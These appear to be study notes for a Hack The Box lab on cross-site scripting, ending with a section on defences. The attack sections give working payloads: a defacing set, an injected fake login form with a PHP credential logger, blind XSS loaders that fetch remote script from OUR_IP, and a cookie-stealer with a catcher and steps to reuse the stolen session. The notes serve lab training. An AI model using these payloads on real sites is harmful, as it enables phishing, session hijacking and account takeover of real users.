XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk. There are three main types of XSS vulnerabilities:

| Type                             | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags).  **DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.** A `#` is a **clue**, not proof of DOM XSS. Why? The part after `#` (the URL fragment) is normally **not sent to the server**, so if JavaScript reads it and unsafely puts it into the page, it **can** lead to DOM XSS. |

For DOM XSS, remember **Source → JavaScript → Sink**. The **Source** is where user-controlled input comes from, such as a URL, `location.hash`, `location.search`, or form input. JavaScript reads that input and sends it to a **Sink**, which is where it is inserted into the webpage. If user-controlled input reaches an unsafe Sink without sanitization, the page may be vulnerable to DOM XSS.

Common **Sources** to recognize:  `location`,  `location.hash`,  `location.search`,  `document.URL`,  `document.referrer`,  `Form/input values`

Common **Sinks** to recognize: `innerHTML`,  `outerHTML`,  `document.write()`,  jQuery: `append()`, `after()`, `add()`

#### XSS Basic Payloads & Commands:

| Payload                                     | Description            |
| ------------------------------------------- | ---------------------- |
| `<script>alert(window.origin)</script>`     | Basic XSS Payload      |
| `<plaintext>`                               | Basic XSS Payload      |
| `<script>print()</script>`                  | Basic XSS Payload      |
| `document.cookie`                           |                        |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |

# For questions in Section 3,4, 5:

`<script>alert(document.cookie)</script>`

`"><img src=/ onerror=alert(document.cookie)>`

---
---

# Section 5 - XSS Discovery Tools & Servers

The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page. We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [Payload-Box](https://github.com/payload-box/xss-payload-list). We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.

Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it. **==Suppose, if you see that the input is being placed directly into the `src` attribute without any sanitation,  you can try a payload like:**==

==`'> <script>alert(window.origin)</script>`, and include anything within that ().==

Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).

But, it may be more efficient to write our own Python script to automate sending these payloads and then comparing the page source to see how our payloads were rendered. The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code.

|Command|Description|
|---|---|
|`python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`|Run `xsstrike` on a URL parameter|
|`sudo nc -lvnp 80`|Start `netcat` listener|
|`sudo php -S 0.0.0.0:80`|Start `PHP` server|


# Section 6 - # Defacing: Modify the Website

It is a stored XSS vulnerability.

| Payload                                                                                       | Description                               |
| --------------------------------------------------------------------------------------------- | ----------------------------------------- |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color                   |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image                   |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title                      |
| `document.getElementById("todo").innerHTML = "New Text"`                                      | change the text displayed on the web page |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body             |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element               |


---
---

# Section 7 - Phishing

We can easily find HTML code for a basic login form, or we can write our own login form. The following example presents a login form:

```html
<h3>Please login to continue</h3> 
<form action=http://OUR_IP>     
<input type="username" name="username" placeholder="Username">     
<input type="password" name="password" placeholder="Password">    
<input type="submit" name="submit" value="Login"> </form>
```

In the above HTML code, `OUR_IP` is the IP address of our VM.

Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function `document.write()` and use it in the XSS payload we found earlier during the XSS Discovery step. Once we minify the HTML code into a single line and add it inside the `write()` function, the final JavaScript code is:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

If the website's previous URL field is still visible, the victim may not believe they need to log in. We can find the element's `id` using **Page Inspector (Ctrl+Shift+C)** and then remove it with:

```javascript
document.getElementById('urlform').remove();
```

Here, `urlform` is the `id` of the URL form. This removes the URL form from the page, leaving only the fake login form we added. We can add this line to the end of the previous JavaScript code. 

**==Suppose, in the xss discovery phase, if you see that the input is being placed directly into the `src` attribute without any sanitation,  you can try a payload like:**==

==`'> <script>alert(window.origin)</script>`, and include that full java code within that ().==

The fake login form sends the submitted credentials in the HTTP request URL, such as:

```text
/?username=test&password=test
```

A basic `netcat` listener can capture the request but cannot properly handle it, causing an error that may alert the victim. Instead, a PHP script can **save the submitted username/password to `creds.txt` and redirect the victim back to the original page**, making the login appear normal.

Create `index.php` inside `/tmp/tmpserver/`:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Replace `SERVER_IP` with the IP from the exercise.

Then start the PHP server:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vi index.php
sudo php -S 0.0.0.0:80
```

The PHP server now handles the HTTP request, saves the submitted credentials to `creds.txt`, and redirects the victim back to the original page.

So:

The form action=http://OUR_IP → creds come to you.
Your PHP server php -S 0.0.0.0:80 runs on you (OUR_IP).
The redirect Location: http://SERVER_IP/phishing/index.php → sends the victim back to the target’s real page.

---
---

# Section 8 - Blind XSS & Session Hijacking

- **Session Hijacking** = a GOAL → steal the victim's **session cookie** so you log in as them **without the password**.
- **Blind XSS** = a TYPE of XSS → your payload runs somewhere you **can't see** (e.g. an admin panel), so you prove it fired by making the victim's browser call back to your machine.

In this lab you combine them: use **Blind XSS discovery** to find the vulnerable field, then drop a **cookie-stealer** to hijack the session. Below is the whole thing in the correct order.


## THE FULL ATTACK IN ORDER 

| Phase | Step | Command / payload |
|-------|------|-------------------|
| **0. Setup** | make your server folder | `mkdir /tmp/tmpserver` then `cd /tmp/tmpserver` |
| 0 | write `script.js` (the cookie-stealer) + `index.php` (the catcher) | see Part 3 and Part 4 |
| 0 | start your server (hosts both files + catches the cookie) | `sudo php -S 0.0.0.0:80` |
| **1. Find the field** | inject a remote-script payload **using the field name as the path** | `<script src="http://OUR_IP/username"></script>` |
| 1 | watch your server log — a hit means that field ran your code | you see `GET /username` → **username field is vulnerable** |
| **2. Exploit** | inject the real payload into the vulnerable field | `<script src=http://OUR_IP/script.js></script>` |
| 2 | victim's browser loads script.js → sends their cookie to you | automatic |
| **3. Catch** | your `index.php` saves the cookie | `cat cookies.txt` |
| **4. Use it** | paste the cookie into your browser → become the victim | DevTools → Storage → Cookies |

Key point on order: **server up FIRST** (Phase 0), because the victim's browser has to be able to fetch `script.js` and your catcher has to be ready when the cookie arrives. Set the trap, then spring it.

---

## PART 1 — The two concepts

### Session cookie theft

Cookies keep users logged in. If you steal a victim's **session cookie** via XSS, you can **hijack their logged-in session without ever knowing the password** — you just become them.

### Blind XSS (Session Hijacking) 

Normal XSS: you see the result right away. **Blind XSS:** the payload is stored and executes **later, somewhere you can't see** — like an admin reviewing your input.

```
Input → stored → Admin opens the panel → XSS executes in the Admin's browser
```

Common places blind XSS lands: **contact forms, reviews, user/profile details, support tickets, HTTP headers**.

Example: you submit a registration at `http://SERVER_IP:PORT/hijacking/index.php` and the page only says:

```
Thank you for registering. An Admin will review your registration request.
```

You can't see the admin panel, so you can't tell if it fired. Solution: use a payload that **calls back to your machine**. If your server gets the request, the payload executed.

---

## PART 2 — "Finding the Vulnerable Field" + "Useful Blind XSS Payloads"

You need two unknowns: **which field is vulnerable** and **which payload works**. Clever trick: load a remote script and **use the field name as the path**, so the server log tells you which field fired.

Test the username field:

```html
<script src="http://OUR_IP/username"></script>
```

If your server receives:

```
GET /username
```

then the **username field is vulnerable**. Repeat per field:

```html
<script src="http://OUR_IP/fullname"></script>
```

```
GET /fullname
```

Start your server before testing:

```bash
mkdir /tmp/tmpserver
```

```bash
cd /tmp/tmpserver
```

```bash
sudo php -S 0.0.0.0:80
```

Then test fields one by one. Skip fields with **strong validation** (e.g. an email field that must be a valid email) if the payload can't get in.

## Useful Blind XSS payloads (from PayloadsAllTheThings)

Try these variations — the right one depends on how the app wraps your input (plain, inside a string `'`, inside double quotes `"`, etc.):

```html
<script src=http://OUR_IP></script>
```

```html
'><script src=http://OUR_IP></script>
```

```html
"><script src=http://OUR_IP></script>
```

```html
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
```

```html
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
```

```html
<script>$.getScript("http://OUR_IP")</script>
```

The `'>` and `">` prefixes **break out** of an attribute/string before injecting — same break-out idea as SQLi. Try plain first, then the quote variants.

---

## PART 3 — Build the cookie-stealer (choose payload, then deliver it) 

### Choose ONE payload (not both)

Once you know the field + a working payload, switch to one that **sends the cookie to your box**:

| Payload | What it does | Trade-off |
|---------|--------------|-----------|
| `document.location='http://OUR_IP/index.php?c='+document.cookie;` | redirects the victim's browser to you, cookie in the URL | **navigates away** → victim sees the page change (obvious) |
| `new Image().src='http://OUR_IP/index.php?c='+document.cookie;` | silently loads an invisible image from you, cookie in the URL | **stays on the page** → victim notices nothing ✅ better |

## Deliver it (put the chosen payload in a file)

Instead of cramming a long payload inline, save it as **`script.js`**:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Then load it with a tiny injection:

```html
<script src=http://OUR_IP/script.js></script>
```

Why host it in a file: injectable fields are often **short**, and long inline JS breaks on **quotes/filters** — a one-line `<script src=...>` dodges both.

The process:

```
XSS → loads script.js → reads document.cookie → sends it to your Attack Machine
```

---

## PART 4 — Catch and save the cookie (index.php) 

Create `index.php` in your server folder — it receives the cookie and appends it to `cookies.txt`:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Server already running from Phase 0 (`sudo php -S 0.0.0.0:80`). When the XSS fires you'll see hits like:

```
10.10.10.10:52798 [200]: /script.js
```

```
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Read what landed:

```bash
cat cookies.txt
```

Example line:

```
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

---

## PART 5 — Use the stolen cookie (become the victim)

A cookie is a **name** and a **value**:

```
cookie = f904f93c949d19d870911bf8b05fe7b2
```

```
Name  = cookie
Value = f904f93c949d19d870911bf8b05fe7b2
```

Steps:

| Step | Action |
|------|--------|
| 1 | In the HTB lab, open `/hijacking/login.php` |
| 2 | Firefox DevTools → **Storage** → **Cookies** |
| 3 | Add the stolen cookie (Name + Value) |
| 4 | **Refresh** the page |

If the app accepts it, you're now in the victim's session — no password needed.

---

# Extras worth knowing

- **HttpOnly kills this attack.** If the session cookie has the `HttpOnly` flag, JavaScript **cannot** read it with `document.cookie` — your stealer gets nothing. That's the #1 defense, and the reason real-world cookie theft often fails. Check the cookie's flags (DevTools → Storage → Cookies → HttpOnly column).
- **`new Image()` beats `document.location`** almost always — no navigation, victim stays put, nothing looks off.
- **Discovery vs exploitation point to different paths:** in Part 2 the `src` is the **field name** (just to read the log). In Part 3 the `src` is **script.js** (the real stealer). Same trick, different target file.
- **Blind XSS = patience:** the payload fires only when the admin/victim opens the page — could be minutes or hours later. Leave the server running.
- **Other things to steal with the same setup:** keystrokes, page content, perform actions as the victim (CSRF-style) — the cookie is just the most common loot.




---
---
# Section 9 - XSS Prevention

XSS mainly happens when **user input (Source)** reaches an unsafe place **(Sink)**. The main defense is to **validate, sanitize, and encode user input on both the front end and back end**.

### Front-end

**Input validation** checks whether the input has the expected format. For example, email validation:

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

**Input sanitization** removes/handles dangerous HTML and JavaScript. DOMPurify can be used:

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

User input should also **not be placed directly** inside `<script>`, `<style>`, HTML attributes, or comments. Avoid unsafe sinks such as:

```text
DOM.innerHTML
DOM.outerHTML
document.write()
document.writeln()
document.domain
```

and jQuery:

```text
html()
parseHTML()
add()
append()
prepend()
after()
insertAfter()
before()
insertBefore()
replaceAll()
replaceWith()
```

### Back-end

Front-end protection can be bypassed by sending custom requests, so **back-end validation and sanitization are essential**.

PHP email validation:

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

PHP sanitization:

```php
addslashes($_GET['email'])
```

NodeJS can use DOMPurify:

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

Never directly display raw user input such as:

```php
$_GET['email']
```

For output, use **HTML encoding** so special characters become harmless text:

```php
htmlentities($_GET['email']);
```

NodeJS:

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

### Server-Side Protection

Useful additional protections include **HTTPS, security headers, Content-Security-Policy (CSP), and secure cookie settings**:

```text
X-Content-Type-Options=nosniff
Content-Security-Policy: script-src 'self'
HttpOnly
Secure
```

A **WAF** can also detect and block many malicious requests.

